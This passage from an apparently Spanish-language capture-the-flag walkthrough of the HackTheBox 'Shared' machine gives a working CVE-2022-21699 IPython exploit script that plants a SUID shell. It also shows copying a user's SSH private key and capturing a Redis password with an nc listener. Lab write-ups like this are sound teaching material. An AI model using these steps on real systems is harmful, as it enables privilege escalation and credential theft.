<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">bash</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./linpeas.sh</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> tee</span><span style="color:#B56959;--shiki-dark:#C3E88D"> linpeas.log</span></span></code></pre> 
<p>No obtenemos nada que destaque en la salida de LinPEAS. Intentemos ejecutar PSpy durante unos minutos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +x</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pspy64</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">timeout</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3</span><span style="color:#B56959;--shiki-dark:#C3E88D">m</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ./pspy64</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> tee</span><span style="color:#B56959;--shiki-dark:#C3E88D"> pspy.log</span></span></code></pre> 
<p>Mirando la salida, el UID 0 y el UID 1001 parecen estar ejecutando comandos rutinarios. El UID 0 es root y el ID de usuario 1001 resulta ser el usuario dan_smith, declarado en <code>/etc/passwd</code>. Se puede observar que dan_smith ejecuta un comando interesante cada minuto.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/bin/sh</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -c</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/bin/pkill</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ipython</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#998418;--shiki-dark:#82AAFF"> cd</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/scripts_review/</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> /usr/local/bin/ipython</span></span></code></pre> 
<p>El usuario entra en el directorio <code>/opt/scripts_review</code> y ejecuta <code>/usr/local/bin/ipython</code>.</p>
<h2 id="cve-2022-21699">CVE-2022-21699</h2>
<p>Tras investigar un poco sobre ipython, nos encontramos con un aviso de vulnerabilidad que detalla un fallo de ejecución de código.</p>
<blockquote>
<p>Nos gustaría revelar una vulnerabilidad de ejecución de código arbitrario en IPython que proviene de IPython ejecutando archivos no confiables en CWD. Esta vulnerabilidad permite a un usuario ejecutar código como otro.</p>
</blockquote>
<p>Comprobemos si la versión de la máquina es vulnerable.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/local/bin/ipython</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --version</span></span></code></pre> 
<p>La versión es 8.0.0, que es vulnerable. Dado que el comando de rutina ejecutado por dan_smith se ejecuta en el directorio /opt/scripts_review, podríamos explotar la vulnerabilidad si <code>/opt/scripts_review</code> es escribible.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ls</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -la</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /opt/scripts_review</span></span></code></pre> 
<p>Es escribible por aquellos en el grupo de desarrolladores. Según la salida del comando id, nuestro usuario actual forma parte de este grupo.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Pongamos a prueba nuestra hipótesis siguiendo las instrucciones del aviso para ejecutar código como dan_smith.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">exploitdir</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/opt/scripts_review</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">cmd</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 777</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$exploitdir</span><span style="color:#B56959;--shiki-dark:#C3E88D">/profile_default</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">mkdir</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -m</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 777</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$exploitdir</span><span style="color:#B56959;--shiki-dark:#C3E88D">/profile_default/startup</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">__import__(&#39;os&#39;).popen(&#39;</span><span style="color:#B56959;--shiki-dark:#BABED8">$cmd</span><span style="color:#B56959;--shiki-dark:#C3E88D">&#39;)</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> &gt;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$exploitdir</span><span style="color:#B56959;--shiki-dark:#C3E88D">/profile_default/startup/x.py</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<p>Después de ejecutar el script y esperar un minuto, nuestro shell SUID debería estar en <code>/tmp/dan_smith_sh.</code></p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># james_mason@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/tmp/dan_smith_sh</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span></span></code></pre> 
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>La primera bandera se encuentra en <code>/home/dan_smith/user.txt</code>
Stabilizing Shell</p>
<p>Copiemos el contenido de <code>/home/dan_smith/.ssh/id_rsa</code> a la máquina atacante y utilicémoslo para iniciar sesión como dan_smith a través de SSH para obtener una shell más estable.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 600</span><span style="color:#B56959;--shiki-dark:#C3E88D"> dan_smith_id_rsa</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ssh</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -i</span><span style="color:#B56959;--shiki-dark:#C3E88D"> dan_smith_id_rsa</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">dan_smith@</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span></code></pre> 
<p>Al ejecutar el comando id, nos enteramos de que nuestro usuario actual forma parte del grupo sysadmin. Veamos a qué tiene acceso especial este grupo.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># dan_smith@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">find</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -group</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sysadmin</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> 2&gt;</span><span style="color:#B56959;--shiki-dark:#C3E88D">/dev/null</span></span></code></pre> 
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">/usr/local/bin/redis_connector_dev</span></span></code></pre> 
<p>Se devuelve un archivo en <code>/usr/local/bin/redis_connector_dev</code>. Este archivo probablemente tiene algo que ver con una solución de almacenamiento de datos clave-valor conocida como Redis. Cuando ejecutamos <code>/usr/local/bin/redis_connector_dev</code>, imprime un mensaje de registro que dice «Logging to redis instance using password» y lo que parece la salida de la consulta INFO Server redis.</p>
<h2 id="redis">Redis</h2>
<p>Recopilemos información básica sobre el archivo y veamos qué ocurre entre bastidores.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># dan_smith@shared.htb (SSH)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">file</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /usr/local/bin/redis_connector_dev</span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span style="color:#59873A;--shiki-dark:#FFCB6B">tr</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">,</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">\n</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span></span></code></pre> 
<p>Basándonos en la salida del comando file, podemos observar algunas cosas sobre el archivo:</p>
<ul>
<li>Es un ejecutable ELF x86-64</li>
<li>se ha compilado con un compilador Go (de ahí el Go BuildID)</li>
<li>No está despojado</li>
</ul>
<p>Dado que el protocolo Redis RESP funciona en texto plano, podríamos capturar la contraseña. En primer lugar, copiemos el archivo en la máquina del atacante.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">scp</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -i</span><span style="color:#B56959;--shiki-dark:#C3E88D"> dan_smith_id_rsa</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">dan_smith@</span><span style="color:#B56959;--shiki-dark:#BABED8">$rhost</span><span style="color:#B56959;--shiki-dark:#C3E88D">:/usr/local/bin/redis_connector_dev</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> .</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">chmod</span><span style="color:#B56959;--shiki-dark:#C3E88D"> +x</span><span style="color:#B56959;--shiki-dark:#C3E88D"> redis_connector_dev</span></span></code></pre> 
<p>Ejecutando el archivo en la máquina atacante, obtenemos un error quejándonos de que el puerto TCP 6379 está cerrado en la dirección loopback. Podemos abrir ese puerto ejecutando nc en una pestaña separada.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># mhil4ne@kali</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nc</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -lv</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 6379</span></span></code></pre> 
<p>Ahora si ejecutamos <code>./redis_connector_dev</code> obtenemos alguna salida al listener.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Connection</span><span style="color:#B56959;--shiki-dark:#C3E88D"> received</span><span style="color:#B56959;--shiki-dark:#C3E88D"> on</span><span style="color:#B56959;--shiki-dark:#C3E88D"> localhost</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 35468</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#89DDFF">*</span><span style="color:#393A34;--shiki-dark:#BABED8">2</span></span>
